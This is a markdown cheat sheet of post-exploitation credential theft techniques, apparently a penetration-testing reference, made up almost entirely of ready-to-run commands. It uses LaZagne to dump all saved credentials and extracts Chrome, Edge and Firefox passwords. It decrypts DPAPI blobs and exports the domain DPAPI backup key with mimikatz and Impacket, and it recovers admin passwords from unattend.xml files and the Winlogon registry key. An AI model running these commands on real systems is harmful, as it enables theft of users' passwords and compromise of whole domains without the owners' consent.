# LaZagne / Browser Credentials / DPAPI / Unattended Files

## LaZagne (multi-platform credential harvester)

```bash
# Windows: extract all stored credentials
laZagne.exe all
laZagne.exe all -vv        # verbose — shows each module result

# Targeted categories
laZagne.exe browsers       # Chrome, Firefox, IE, Edge saved passwords
laZagne.exe windows        # Windows Credential Manager, DPAPI-protected
laZagne.exe sysadmin       # WinSCP, PuTTY, FileZilla, OpenSSH
laZagne.exe databases      # MySQL, PostgreSQL, DBngin saved creds
laZagne.exe wifi           # saved Wi-Fi PSKs

# Linux
python3 laZagne.py all
python3 laZagne.py browsers
python3 laZagne.py sshkeys   # ~/.ssh/ private keys

# Output to file
laZagne.exe all -oN          # plain text output
laZagne.exe all -oJ          # JSON output
```

---

## Browser Credential Extraction

### Chrome / Edge (Chromium-based)

```powershell
# Manual path (requires killing browser or using VSS)
# Login Data: %LocalAppData%\Google\Chrome\User Data\Default\Login Data
# Cookies:    %LocalAppData%\Google\Chrome\User Data\Default\Network\Cookies

# SharpChrome (handles DPAPI decryption automatically)
SharpChrome.exe logins           # saved logins
SharpChrome.exe cookies          # cookies
SharpChrome.exe logins /pvk:masterkey.pvk   # offline with domain backup key
```

```python
# Python manual extraction (must have user's DPAPI master key access)
import sqlite3, json, base64, win32crypt
from Crypto.Cipher import AES

db = sqlite3.connect(r'C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Login Data')
for row in db.execute("SELECT origin_url, username_value, password_value FROM logins"):
    url, user, enc_pass = row
    # Decrypt: strip b'v10' prefix, use AES-256-GCM with key from Local State
    print(f"{url} | {user}")
```

### Firefox

```bash
# firefox_decrypt (requires access to Firefox profile)
python3 firefox_decrypt.py /path/to/firefox/profile/
python3 firefox_decrypt.py ~/.mozilla/firefox/xxxxx.default-release/

# Windows path
python3 firefox_decrypt.py "%APPDATA%\Mozilla\Firefox\Profiles\xxxxxx.default"
```

---

## DPAPI Credential Decryption

DPAPI protects: browser passwords, Windows Credential Manager, certificates.

```
# List DPAPI-protected credential blobs
cmdkey /list
dir C:\Users\user\AppData\Local\Microsoft\Credentials\
dir C:\Users\user\AppData\Roaming\Microsoft\Protect\     # master keys here

# Mimikatz: decrypt credential blob (needs current user context or SYSTEM)
mimikatz # privilege::debug
mimikatz # dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\DFBE70A7...
mimikatz # dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\DFBE70A7... /unprotect

# Mimikatz: extract master key (needed for offline or cross-user decryption)
mimikatz # dpapi::masterkey /in:C:\Users\user\AppData\Roaming\Microsoft\Protect\S-1-5-21-xxx\GUID /rpc
# /rpc asks DC to decrypt (works if you have user's credentials)

# Impacket: offline DPAPI with domain backup key
dpapi.py masterkey -file masterkey.file -sid S-1-5-21-xxx -password user_password
dpapi.py credential -file credential.file -key DECRYPTED_MASTERKEY
```

**Domain backup key** (Golden Key — decrypts any DPAPI blob in domain):
```bash
# Dump domain DPAPI backup key (requires domain admin)
mimikatz # lsadump::backupkeys /system:DC_IP /export
# or
dpapi.py backupkeys --target DC_IP -u DOMAIN/admin -p password --export
# Use saved .pvk to decrypt any DPAPI blob offline
```

---

## Unattended Installation Files

Contain plaintext or Base64-encoded admin passwords left over from automated deployments.

```powershell
# Default locations
dir /s /b C:\Windows\Panther\Unattend.xml 2>nul
dir /s /b C:\Windows\System32\Sysprep\unattend.xml 2>nul
dir /s /b C:\Windows\System32\Sysprep\sysprep.xml 2>nul

# Full recursive search
Get-ChildItem -Path C:\ -Recurse -Include "unattend.xml","sysprep.xml","*unattend*","*sysprep*" `
  -ErrorAction SilentlyContinue | Select-Object FullName

# Extract password fields
findstr /i /c:"Password" /c:"AutoLogon" /c:"AdminPassword" C:\Windows\Panther\Unattend.xml

# Decode Base64 encoded password (common format in these files)
$encoded = "QQBkAG0AaQBuAEAAMQAyADMA"
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
# Output: Admin@123

# Metasploit module
use post/windows/gather/enum_unattend
run
```

**Also check**:
- `C:\inetpub\wwwroot\web.config` — database connection strings
- `C:\*\*.config` — application config files with connection strings
- Registry: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` → `DefaultPassword`
```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```
